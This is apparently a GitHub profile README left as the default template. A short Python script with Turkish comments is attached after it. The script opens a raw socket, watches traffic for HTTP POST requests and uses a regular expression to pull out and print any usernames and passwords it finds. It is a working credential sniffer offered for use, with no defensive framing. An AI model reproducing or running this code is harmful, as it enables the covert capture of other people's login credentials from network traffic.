- 👋 Hi, I’m @Neutronxq
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
Neutronxq/Neutronxq is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import socket
import re

# Kullanıcı adı ve şifreyi almak için regex deseni
username_password_pattern = re.compile(r"(username|user|login|email)=(\S+).*?(password|pass)=(\S+)")

def listen_for_post_requests():
    # Soket oluşturma ve bağlama
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.bind(("0.0.0.0", 0))  # Tüm IP'lerden gelen veriyi dinler (port verilmez)
    print("Dinleniyor: Tüm POST istekleri üzerinde")

    while True:
        data, addr = s.recvfrom(65535)  # Tüm veriyi al
        data = data.decode('utf-8', errors='ignore')  # Veriyi metne çevir

        # Eğer gelen veri POST isteği içeriyorsa
        if "POST" in data:
            match = username_password_pattern.search(data)  # Regex ile kullanıcı adı ve şifreyi ara
            if match:
                username = match.group(2)  # Kullanıcı adı
                password = match.group(4)  # Şifre
                print(f"Kullanıcı Adı: {username}, Şifre: {password}")  # Yazdır

# Dinlemeyi başlat
listen_for_post_requests()  # POST isteklerini dinlemeye başla
